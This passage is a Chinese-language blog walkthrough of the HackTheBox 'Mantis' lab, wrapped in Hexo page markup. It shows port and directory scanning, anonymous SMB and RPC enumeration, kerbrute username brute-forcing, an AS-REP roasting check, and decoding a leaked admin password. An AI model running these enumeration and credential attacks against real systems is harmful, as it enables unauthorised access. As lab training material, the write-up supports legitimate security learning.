@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>HTB: Mantis - T0x1c</title>
+
+  
+    <meta name="description" content="Mantis是一个困难的靶机，知识点涉及多种进制解码、SQL server数据库登陆、smb利用、黄金票据提权等。信息泄漏可直接获取数据库和CMS的账号密码，在数据库中找到用户的登录凭证，通过制作黄金票据访问系统。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB: Mantis">
+<meta property="og:url" content="https://toxic80l.github.io/post/7e81c547/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="Mantis是一个困难的靶机，知识点涉及多种进制解码、SQL server数据库登陆、smb利用、黄金票据提权等。信息泄漏可直接获取数据库和CMS的账号密码，在数据库中找到用户的登录凭证，通过制作黄金票据访问系统。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0220.gif">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%883.31.40.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%884.28.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%884.29.20.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%884.29.32.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%884.35.16.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%882.07.45.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%884.35.37.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%882.34.17.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%882.35.29.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%882.16.37.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%882.19.50.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%883.52.21.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%882.56.31.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%883.35.01.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%883.35.20.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%883.37.04.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%883.42.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%883.45.32.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%883.48.43.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%883.59.04.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%883.59.20.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%884.01.54.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%884.02.27.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%884.12.58.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%884.17.35.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%884.17.25.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%884.25.26.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%884.33.04.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%884.36.11.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%884.37.58.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%884.39.50.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%884.41.06.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8A%E5%8D%889.52.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8A%E5%8D%889.56.32.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8A%E5%8D%889.57.43.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8A%E5%8D%8810.35.23.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8A%E5%8D%8810.06.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8A%E5%8D%8810.38.20.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8A%E5%8D%8810.02.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8A%E5%8D%8810.46.48.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8A%E5%8D%8810.48.21.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8A%E5%8D%8811.15.51.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8A%E5%8D%8811.16.39.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8A%E5%8D%8811.12.09.png">
+<meta property="article:published_time" content="2022-02-09T02:18:59.000Z">
+<meta property="article:modified_time" content="2022-02-09T06:46:19.413Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="靶机">
+<meta property="article:tag" content="smb">
+<meta property="article:tag" content="SQL server">
+<meta property="article:tag" content="ms14-068">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0220.gif">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BE%A6%E6%9F%A5"><span class="toc-text">0x01 侦查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-text">端口探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1337%E7%AB%AF%E5%8F%A3"><span class="toc-text">1337端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8080%E7%AB%AF%E5%8F%A3"><span class="toc-text">8080端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#445%E7%AB%AF%E5%8F%A3"><span class="toc-text">445端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#88%E7%AB%AF%E5%8F%A3"><span class="toc-text">88端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F"><span class="toc-text">密码信息泄漏</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#OrchardCMS%E5%AF%86%E7%A0%81"><span class="toc-text">OrchardCMS密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQLserver%E5%AF%86%E7%A0%81"><span class="toc-text">SQLserver密码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%B8%8A%E7%BA%BF-james"><span class="toc-text">0x02 上线[james]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLserver%E6%95%B0%E6%8D%AE%E5%BA%93%E7%99%BB%E5%BD%95"><span class="toc-text">SQLserver数据库登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smb%E7%99%BB%E9%99%86"><span class="toc-text">smb登陆</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-system"><span class="toc-text">0x03 权限提升[system]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ms14-068%E8%87%AA%E5%8A%A8%E6%8F%90%E6%9D%83"><span class="toc-text">ms14-068自动提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ms14-068%E6%89%8B%E5%8A%A8%E6%8F%90%E6%9D%83"><span class="toc-text">ms14-068手动提权</span></a></li></ol></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/HackTheBox/">HackTheBox</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2022-02-09T02:18:59.000Z">2022-02-09</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>HTB: Mantis</span></h1>
+<p>Mantis是一个困难的靶机，知识点涉及多种进制解码、SQL server数据库登陆、smb利用、黄金票据提权等。信息泄漏可直接获取数据库和CMS的账号密码，在数据库中找到用户的登录凭证，通过制作黄金票据访问系统。感兴趣的同学可以在HackTheBox中进行学习。</p>
+<span id="more"></span>
+<span class="tag-plugin emoji"><img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0220.gif" style="height:3em" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></span>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%883.31.40.png" alt="截屏2021-10-26 下午3.31.40"></p>
+<h2 id="0x01-侦查"><a href="#0x01-侦查" class="headerlink" title="0x01 侦查"></a>0x01 侦查</h2><h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><p>首先通过nmap对目标进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -p- -sV -sC -A 10.10.10.52 -oA nmap_Mantis</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%884.28.34.png" alt="截屏2021-10-26 下午4.28.34"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%884.29.20.png" alt="截屏2021-10-26 下午4.29.20"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%884.29.32.png" alt="截屏2021-10-26 下午4.29.32"><br>扫描结果显示目标开放了88、135、445、1433、1337、8080等多个端口</p>
+<h4 id="1337端口"><a href="#1337端口" class="headerlink" title="1337端口"></a>1337端口</h4><p>访问后发现这是 IIS 默认界面<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%884.35.16.png" alt="截屏2021-10-26 下午4.35.16"><br>开始对目标进行目录扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.52:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%882.07.45.png" alt="截屏2021-10-27 下午2.07.45">结果显示存在<code>/secure_notes</code>目录</p>
+<h4 id="8080端口"><a href="#8080端口" class="headerlink" title="8080端口"></a>8080端口</h4><p>访问后为发现这是个人博客站点<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%884.35.37.png" alt="截屏2021-10-26 下午4.35.37"><br>继续对目标进行目录扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.52:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%882.34.17.png" alt="截屏2021-10-27 下午2.34.17"><br>扫描结果显示存在<code>/admin</code>目录，访问该目录发现这是管理员登陆窗口<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%882.35.29.png" alt="截屏2021-10-27 下午2.35.29"><br>尝试弱口令爆破，未发现可用账号密码</p>
+<h4 id="445端口"><a href="#445端口" class="headerlink" title="445端口"></a>445端口</h4><p>面对 smb 服务，我们可以使用 smbmap 和 smbclient 进行测试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.52</span><br><span class="line">smbclient -N -L //10.10.10.52</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%882.16.37.png" alt="截屏2021-10-27 下午2.16.37"><br>结果显示虽然我们能够通过 smb 匿名登录进行访问，但是其中目录不存在多余的文件。使用 rpcclient 对445端口进行 rpc 连接，虽然能够连接但是仍然提示拒绝进入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rpcclient -U <span class="string">&#x27;&#x27;</span> -N 10.10.10.52</span><br><span class="line">rpc &gt; querydispinfo</span><br><span class="line">rpc &gt; enumdomusers</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%882.19.50.png" alt="截屏2021-10-27 下午2.19.50"></p>
+<h4 id="88端口"><a href="#88端口" class="headerlink" title="88端口"></a>88端口</h4><p>通过 nmap 扫描信息我们可以发现该域名为 htb.local，我们可以使用该域名来爆破 kerberos 用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute userenum --domain htb.local /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.52</span><br></pre></td></tr></table></figure>
+<p>由于 kerbrute 在 kali 中默认未安装，我们可在 github 中进行下载获得并赋予执行权限<br><strong>下载地址：<a target="_blank" rel="noopener" href="https://github.com/ropnop/kerbrute/releases/tag/v1.0.3">https://github.com/ropnop/kerbrute/releases/tag/v1.0.3</a></strong><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%883.52.21.png" alt="截屏2021-10-27 下午3.52.21"></p>
+<p>发现存在三个用户名并将它们写入 users，使用 GetNPUser.py 进行检测不需要 Kerberos 预认证属性（UF_DONT_REQUIRE_PREAUTH）的用户TGT</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/doc/python3-impacket/examples/GetNPUsers.py . </span><br><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> $(cat users); <span class="keyword">do</span> python3 GetNPUsers.py htb.local/<span class="variable">$&#123;user&#125;</span> -no-pass -dc-ip 10.10.10.52 2&gt;/dev/null | grep -F -e <span class="string">&#x27;[+]&#x27;</span> -e <span class="string">&#x27;[-]&#x27;</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%882.56.31.png" alt="截屏2021-10-27 下午2.56.31"><br>但不幸的是这几个用户都没有与认证属性</p>
+<h3 id="密码信息泄漏"><a href="#密码信息泄漏" class="headerlink" title="密码信息泄漏"></a>密码信息泄漏</h3><p>访问目录<code>secure_notes</code>，其中<code>web.config</code>无法查看<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%883.35.01.png" alt="截屏2021-10-27 下午3.35.01"><br>查看 dev_notes.txt.txt 文件，其中包含了搭建 OrchardCMS 的相关步骤，如下载 SQL server 数据库、创建对应数据库和管理员等<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%883.35.20.png" alt="截屏2021-10-27 下午3.35.20"><br>除了以上信息，在底部我们还发现一串二进制代码<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%883.37.04.png" alt="截屏2021-10-27 下午3.37.04"><br>通过提示可知 OrchardCMS 将这串二进制作为 admin 用户的凭证，而SQL server 管理员用户 sa 的凭证为文件名。</p>
+<h4 id="OrchardCMS密码"><a href="#OrchardCMS密码" class="headerlink" title="OrchardCMS密码"></a>OrchardCMS密码</h4><p>首先使用 perl 和 shell 命令将以上二进制代码解码为 OrchardCMS 凭证</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -lpe <span class="string">&#x27;$_=pack&quot;B*&quot;,$_&#x27;</span> &lt; &lt;(<span class="built_in">echo</span> 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001)</span><br></pre></td></tr></table></figure>
